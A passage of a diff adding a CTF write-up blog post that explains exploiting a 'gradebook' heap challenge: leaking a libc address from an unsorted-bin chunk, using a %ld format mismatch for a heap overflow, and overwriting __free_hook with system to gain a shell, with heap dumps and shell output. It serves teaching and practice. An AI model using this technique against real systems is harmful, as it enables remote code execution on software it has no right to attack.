+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd_nextsize</span><span class="p">;</span> <span class="cm">/* double links -- used only if free. */</span>
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk_nextsize</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>As you probably know, the chunk that the user of <code class="language-plaintext highlighter-rouge">malloc</code> recieves points to where <code class="language-plaintext highlighter-rouge">fd</code> would be in memory; by clearing the first 8 bytes of said memory we clear the <code class="language-plaintext highlighter-rouge">fd</code> pointer. But as the comment says these are double links, meaning both can be used.</p>
+
+<p>A simple tcache or fastbin which is organized as a singly linked list only needs <code class="language-plaintext highlighter-rouge">fd</code>, which the <code class="language-plaintext highlighter-rouge">memset</code> call correctly clears, however chunks in the large and unsorted bin are a <code class="language-plaintext highlighter-rouge">double</code> linked list. I think you know where i’m going with this.</p>
+
+<p>It gets better - chunks free’d into the unsorted-bin have their <code class="language-plaintext highlighter-rouge">bk</code> pointing back into libc where the bin-list starts:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">nextchunk</span> <span class="o">!=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// [...]</span>
+          <span class="cm">/*
+    	Place the chunk in unsorted chunk list. Chunks are
+    	not placed into regular bins until after they have
+    	been given one chance to be used in malloc.
+          */</span>
+
+          <span class="n">bck</span> <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span> <span class="c1">// gets location of unsorted bin list - the offset of 'fd' in malloc_chunk (16)</span>
+          <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">))</span>
+    	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"free(): corrupted unsorted chunks"</span><span class="p">);</span>
+          <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+          <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Theres only one issue: if we dont want our unsorted-bin chunk to immediately be consumed into the top chunk, as is its perogative, we need to fulfill the check which allows us to enter this branch of code in the first place (look at the top of the code snip).</p>
+
+<p>So we need to:</p>
+
+<ol>
+  <li>Allocate a student with a big name (at least unsorted-bin size)</li>
+  <li>Allocate another student, not unsorted size so it wont consolidate with top when free’d</li>
+  <li>Clear the gradebook, thus freeing both chunks.</li>
+  <li>Allocate the student with the big name size again, fill in the first 8 bytes but no more.</li>
+  <li>List students -&gt; ptr to main_arena comes after the 8 bytes you filled.</li>
+</ol>
+
+<p>In hidnsight I realize now that allocating the student chunk before the ID is validated can be used to create a barrier dummy chunk without having to make a whole new student -_-. 
+In action this looks like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter student id: 
+0
+Enter student name length: 
+1500
+Enter student name: 
+AAAAAAA
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 2
+
+NAME: AAAAAAA
+�K��� &lt;------------- leaks yay
+STUDENT ID: 0
+GRADE: Not Entered Yet
+____________________________
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 
+
+</code></pre></div></div>
+
+<h2 id="arbitrary-write">Arbitrary write</h2>
+
+<p>Remember earlier when I commented about the <code class="language-plaintext highlighter-rouge">%ld</code> format string used in update grade?</p>
+
+<p>Remember the layout of each student struct:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">struct_s</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">ID</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">grade</span><span class="p">;</span> <span class="c1">// we write an 8 byte number here</span>
+    <span class="kt">int</span> <span class="n">name_length</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now, take into account that <code class="language-plaintext highlighter-rouge">%ld</code> allows you to enter numbers up to 8 bytes. You see it yet? We can use this mismatch to overwrite not only grade, but all of name_length after the allocation for name has already been created. Thus we can use this to make a heap overflow</p>
+
+<p>Take a look at the chaos this can cause:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Student Gradebook
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 1
+
+Enter student id: 
+0
+Enter student name length: 
+20
+Enter student name: 
+asdf
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 3
+
+Enter student id: 
+0
+Enter grade: 18446744073709551615 // == 0xffffffffffffffff
+Grade must be between 0 and 100
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 4
+
+Enter student id: 
+0
+Enter student name: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+1. Add Student to Gradebook
+2. List Students in Gradebook
+3. Update Student grade
+4. Update Student name
+5. Clear Gradebook
+6. Exit Gradebook
+&gt; 
+
+</code></pre></div></div>
+<p>Lets have a look at the top chunk now:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)
+    [0x00005555555592a0     30 00 00 00 00 00 00 00 ff ff ff ff ff ff ff 7f    0...............]
+Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE)
+    [0x00005555555592c0     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
+Chunk(addr=0x5555555592e0, size=0x4141414141414140, flags=PREV_INUSE)  ←  top chunk
+
+</code></pre></div></div>
+<blockquote>
+  <p>:)</p>
+</blockquote>
+
+<p>Now that we know how we have a heap overflow, how can we use this? Well another apect of the student struct is it stores the <code class="language-plaintext highlighter-rouge">name</code> pointer which can be written to via <code class="language-plaintext highlighter-rouge">update_name</code>. So if a student struct is stored AFTER our <code class="language-plaintext highlighter-rouge">name</code> buffer in memory we can completely overwrite all of its members, including the <code class="language-plaintext highlighter-rouge">name</code>. Since we also have a leak this is pretty much game over.</p>
+
+<p>If you look at the heap immediately after our unsorted bin shenanigans, you can see that:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Chunk(addr=0x55a886bef010, size=0x290, flags=PREV_INUSE)
+    [0x000055a886bef010     01 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x55a886bef2a0, size=0x20, flags=PREV_INUSE)
+    [0x000055a886bef2a0     00 00 00 00 00 00 00 00 10 f0 be 86 a8 55 00 00    .............U..]
+Chunk(addr=0x55a886bef2c0, size=0x510, flags=PREV_INUSE) // name buffer
+    [0x000055a886bef2c0     41 41 41 41 41 41 41 41 e0 0b 07 ba f9 7f 00 00    AAAAAAAA........]
+Chunk(addr=0x55a886bef7d0, size=0x20, flags=PREV_INUSE) // student stucture for the above name
+    [0x000055a886bef7d0     00 00 00 00 00 00 00 00 ff ff ff ff 00 05 00 00    ................]
+Chunk(addr=0x55a886bef7f0, size=0x30, flags=PREV_INUSE)
+    [0x000055a886bef7f0     00 00 00 00 00 00 00 00 10 f0 be 86 a8 55 00 00    .............U..]
+Chunk(addr=0x55a886bef820, size=0x207f0, flags=PREV_INUSE)  ←  top chunk
+</code></pre></div></div>
+
+<p>Due to the way we get our leaks, the barrier chunk we allocate as a student is free’d, and is then consumed when we allocate another chunk for the leak AS THAT CHUNK’s STUDENT STRUCTURE.</p>
+
+<p>This means that we can overwrite all members of the struct, including the <code class="language-plaintext highlighter-rouge">name</code> ptr. One thing to be aware of is that you will also smash the <code class="language-plaintext highlighter-rouge">ID</code>, so you need to set it back to a number/string you know so you can find struct again to overwrite the name.</p>
+
+<p>Another problem I had was I kept overwriting the name length with <code class="language-plaintext highlighter-rouge">0xffffffff</code>, because of this the <code class="language-plaintext highlighter-rouge">read</code> syscall in <code class="language-plaintext highlighter-rouge">update_name</code> was failing since the read length went outside the address space of the program - simply use a smaller value for this.</p>
+
+<h2 id="what-to-write">What to write?</h2>
+
+<p>We have a libc leak, and libc in use is 2.31 which means the various debugging hooks in libc (<code class="language-plaintext highlighter-rouge">__free_hook</code>, etc…) are still in use. Imma assume you know about these, but if you dont.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
+<span class="nf">__libc_free</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">mem</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">;</span>
+  <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">;</span>                          <span class="cm">/* chunk corresponding to mem */</span>
+
+  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
+    <span class="o">=</span> <span class="n">atomic_forced_read</span> <span class="p">(</span><span class="n">__free_hook</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">hook</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="c1">// if __free_hook != 0</span>
+    <span class="p">{</span>
+      <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)(</span><span class="n">mem</span><span class="p">,</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">));</span> <span class="c1">// call whatever is there</span>
+      <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>If we set the hook to any value other than 0, we get instant RCE. As a bonus the chunk passed to free is also the first argument, meanng if you control the data in the chunk, you may pass anything you want as the first argument.</p>
+
+<p>All my exploit does is set the new name ptr as <code class="language-plaintext highlighter-rouge">&amp;__free_hook</code>, and overwriting it with <code class="language-plaintext highlighter-rouge">system</code>. Prior to freeing the chunks to trigger <code class="language-plaintext highlighter-rouge">system</code>, you must have a chunk which will be freed which contains your command, so you can execute <code class="language-plaintext highlighter-rouge">system(your_cmd)</code>.</p>
+
+<p>After overwriting name:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000556f775ac7d0│+0x0000: 0x0000000000000000 // id
+                              [length] [grade]
+0x0000556f775ac7d8│+0x0008: 0x00000100ffffffff
+0x0000556f775ac7e0│+0x0010: 0x00007f15844d1b28  →  0x0000000000000000 // name ptr (__free_hook)
+</code></pre></div></div>
+
+<p>And after the new name, <code class="language-plaintext highlighter-rouge">system</code> is written</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000556f775ac7d0│+0x0000: 0x0000000000000000
+0x0000556f775ac7d8│+0x0008: 0x00000100ffffffff
+0x0000556f775ac7e0│+0x0010: 0x00007f15844d1b28  →  0x00007f1584338410  →  &lt;system+0&gt; endbr64 
+</code></pre></div></div>
+
+<p>And finally, after we free:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la
+[DEBUG] Sent 0x7 bytes:
+    b'ls -la\n'
+[DEBUG] Received 0x177 bytes:
+    b'total 2024\n'
+    b'drwxr-xr-x  2 root root    4096 Nov 14 17:00 .\n'
+    b'drwxr-xr-x 15 root root    4096 Nov 13 22:02 ..\n'
+    b'-rw-r--r--  1 root root    2380 Nov 14 17:00 exp2.py\n'
+    b'-rw-r--r--  1 root root    2367 Nov 12 20:35 exp.py\n'
+    b'-rwxr-xr-x  1 root root   17608 Nov 11 21:34 gradebook\n'
+    b'-rwxr-xr-x  1 root root 2029224 Nov 11 21:34 libc.so.6\n'
+    b'-rw-r--r--  1 root root     283 Nov 12 22:34 notes.md\n'
+total 2024
+drwxr-xr-x  2 root root    4096 Nov 14 17:00 .
+drwxr-xr-x 15 root root    4096 Nov 13 22:02 ..
+-rw-r--r--  1 root root    2380 Nov 14 17:00 exp2.py
+-rw-r--r--  1 root root    2367 Nov 12 20:35 exp.py
+-rwxr-xr-x  1 root root   17608 Nov 11 21:34 gradebook
+-rwxr-xr-x  1 root root 2029224 Nov 11 21:34 libc.so.6
+-rw-r--r--  1 root root     283 Nov 12 22:34 notes.md
+$  
+</code></pre></div></div>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>This was a nice challenge - i’ve never seen something as subtle as a format string mismatch in a ctf challenge before - it was only one character away from being correct.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Actually all of the challenges I tried were pretty fun - well except the math challenges, I dont wanna talk about that :</td>
+      <td>.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>See you in 3 months time when I make another one of these, or it might be before. Idk.</p>
+
+<p>Peace out.</p>
+
+  
+</article>
+
+
+
+<footer>
+  <div>Made with <b style="color: #f45;">&lt;3</b></div>
+  <nav><a href="mailto:volticks@gmail.com" ><svg aria-label="Mail" class="icon"><use xlink:href="/assets/fontawesome/icons.svg#envelope"></use></svg></a><a href="https://github.com/volticks" ><svg aria-label="Github" class="icon"><use xlink:href="/assets/fontawesome/icons.svg#github"></use></svg></a><a href="/feed.xml" ><svg aria-label="Subscribe" class="icon"><use xlink:href="/assets/fontawesome/icons.svg#rss"></use></svg></a></nav>
+
+</footer>
+
+
+</html>
